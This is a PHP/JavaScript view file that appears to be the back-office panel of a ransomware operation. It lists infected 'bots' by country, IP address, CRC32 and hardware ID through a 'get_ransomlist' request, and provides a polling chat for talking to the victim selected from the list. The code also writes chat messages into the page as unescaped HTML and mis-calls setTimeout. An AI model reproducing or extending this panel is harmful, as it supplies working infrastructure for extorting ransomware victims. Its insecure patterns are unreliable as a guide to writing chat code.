<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 10/6/14
 * Time: 2:42 AM
 */

?>
 
  <script>
    var baseUrl = "<?php echo base_url()?>";
    var dtdraw;
    function formatDate(d) {

               month = '' + (d.getMonth() + 1),
               day = '' + d.getDate(),
               year = d.getFullYear();
               hour = d.getHours();
               min = d.getMinutes();
               ss = d.getSeconds();

                if (month.length < 2) month = '0' + month;
                if (day.length < 2) day = '0' + day;
                date = [year, month, day].join('-');
                time = [hour, min, ss].join(':')
                return date;
      }
      function formatTime(d) {

               month = '' + (d.getMonth() + 1),
               day = '' + d.getDate(),
               year = d.getFullYear();
               hour = d.getHours();
               min = d.getMinutes();
               ss = d.getSeconds();

                if (month.length < 2) month = '0' + month;
                if (day.length < 2) day = '0' + day;
                date = [year, month, day].join('-');
                time = [hour, min, ss].join(':')
                return time;
      }
    $(document).ready(function() {
      var unread_msg =0;
      $("#unread_msg_id").on('click',function(event){
             
              if(this.checked) {
			        unread_msg = 1;
			   }
			   else{
			   	  unread_msg = 0;
			   }
              //console.log(unread_msg)
              dtdraw.draw(true);

       });
      dtdraw =    $('#datatable').DataTable({
              "processing": true,
              "serverSide": true,
              "ajax": {
                  "url":"main/ajax_call"
                  ,"type": "GET"
                  
                  ,"data": function ( d ) {
		                d.action = "get_ransomlist";
		                d.data = "";
		                d.unread_msg = unread_msg;
		                // etc
		            }
              }
              ,"pagingType": "full_numbers",
              "lengthMenu": [
                  [5,10, 25, 50, -1],
                  [5,10, 25, 50, "All"]
              ],
              responsive: true,
              language: {
                  search: "_INPUT_",
                  searchPlaceholder: "Search records",
              }
              ,"columns": [
                { "width": "20%" },
                { "width": "20%" },
                { "width": "25%" },
                { "width": "20%" },
                { "width": "15%" }
              ]
              ,columnDefs: [{
                  "targets": 0,
                 
                  "render": function (data, type, row) {
                    var val = row.country;
                    val += "<br>" + row.ipaddress;
                      return val ;
                  }
              }
              ,{
                  "targets": 1,
                  
                  "render": function (data, type, row) {
                       return row.crc32;
                  }
              },
              {
                  "targets": 2,
                  
                  "render": function (data, type, row) {
                      var myDate = new Date(1000*row.createdAt);
                      var val = formatDate(myDate);
                       val += "<br>" + formatTime(myDate);
                      return val;
                  }
              }
              ,{
                  "targets": 3,
                  
                  "render": function (data, type, row) {
                      
                      return "<input type='button' data = '"+row.crc32+"' id='"+row.hwid+"' value='Start Chat' class='start-chat btn btn-primary'/>";
                  }
              }
              ,{
                  "targets": 4,
                  
                  "render": function (data, type, row) {
                      
                      return row.hwid;
                  }
              }
              ],

          });

         dtdraw.on('click','tr td .start-chat',function(event){
              var hwid = $(this).prop("id");
              var crc32 = $(this).attr("data");
              console.log(hwid)
              console.log(crc32)
              $("#id-crc32").html("Bot CRC32 : "+crc32);
              onUser(hwid);

        });
    });


  </script>

<script>
    var previousUserId = -1;
    var tableName = "";
    var userId = $('#userid').val();
    var interval;
    var history;
    var last_id = {};
    var messageBox = document.getElementById("message-box");
    function formatChatTime(d) {

               month = '' + (d.getMonth() + 1),
               day = '' + d.getDate(),
               year = d.getFullYear();
               hour = d.getHours();
               min = d.getMinutes();
               ss = d.getSeconds();

                if (month.length < 2) month = '0' + month;
                if (day.length < 2) day = '0' + day;
                date = [year, month, day].join('-');
                time = [hour, min].join(':')
                return time;
      }
    function onUser(id){
        $('#' + id).addClass('back-black');
        if(previousUserId != -1){
            $('#' + previousUserId).removeClass('back-black');
        }
        previousUserId = id;

        loadHistory(id);
    }

    function loadHistory(id){
//        var sum = parseInt(id) + parseInt(userId);
        tableName = id;

        if(interval != undefined){
            clearInterval(interval);
        }

        if( history[tableName] == undefined ){
            history[tableName] = "";
            last_id[tableName] = "-1";
//            console.log(last_id);
            getMessages(tableName , -1);
        }
        else{
          getMessages(tableName , last_id[tableName]);
        }
        //interval = setInterval(function (){   getMessages(tableName , last_id[tableName]); } , 1000);
        
    }

    function getMessages( tablename , lastid){
        var params = {
            action:'get_message',
            data: {
                tablename: tableName,
                lastid: lastid,
                userid: userId,
            }
        };

        $.ajax({
            url: "main/ajax_call",
            type: "POST",
            dataType: "json",
            data: params,
            success: function onSuccess(res){
//                console.log("Message Get Successed!");
                //console.log(res);
                var isInit = false;
                if(history[tableName] == ""){
                    isInit = true;
                }
                for(var i=0;i<res.length;i++){
//                    console.log(res[i]);
                    res[i]['message'] = res[i]['message'].replace("~b" , "'");
                    var date = new Date(res[i]['send_date']);
                    var strtime = formatChatTime(date);
                    console.log(strtime)
                    var str_class = (res[i]['from'] == userId) ? 'btn-primary chatting-right' : 'chatting-left';
                    var timeclass = (res[i]['from'] == userId) ? 'chatting-right' : 'chatting-left';
                    history[tableName] +="<div class='row'><div class='col-md-12 display-block'>";
                    history[tableName] +="<p class='" + str_class + "'>" + res[i]['message'] + "";
                    history[tableName] +="<span style='margin-left:15px;margin-left:15px;' class='" + "" + "'>(" + strtime + ")</span>";
                    history[tableName] += "</p></div></div>";
                }
                try{
                    last_id[tableName] = res[res.length -1]['id'];
                } catch(e){}

                if(messageBox.scrollTop > messageBox.scrollHeight - messageBox.offsetHeight - 5 || isInit){
                    isInit = true;
                }
                $('#message-box').html(history[tableName]);
                if(isInit){
                    scrollToBottom();
                }
                setTimeout(getMessages(tableName , last_id[tableName]),1000);
            },
            error: function onError(res){
                console.log("Message Get Successed!");
                console.log(res);
                setTimeout(getMessages(tableName , last_id[tableName]),1000);
            }
        })
    }

    function onMessageSend(){
        if(previousUserId == -1){
            alert("Please select the user and send again!");
            return;
        }

        var msg = $('#message_content').val();
        var trimStr = $.trim(msg);
    if(trimStr == "") return;
        msg = msg.replace("'" , "~b");
        var params = {
            action:'send_message',
            data: {
                tablename: tableName,
                userid: userId,
                message: msg,
            }
        };

        $.ajax({
            url: "main/ajax_call",
            type: "POST",
            dataType: "json",
            data: params,
            success: function onSuccess(res){
//                console.log("Message Sent Successed!");
//                console.log(res);
                $('#message_content').val("");
                scrollToBottom();
            },
            error: function onError(res){
                console.log("Error in message send!");
                console.log(res);
            }
        })
    }

    function scrollToBottom(){
        messageBox.scrollTop = messageBox.scrollHeight - messageBox.offsetHeight;
    }

    var input = document.getElementById("message_content");
    input.addEventListener("keypress", function(event) {
        if (event.keyCode != 13) {
            return;
        }
        onMessageSend();
    });
</script>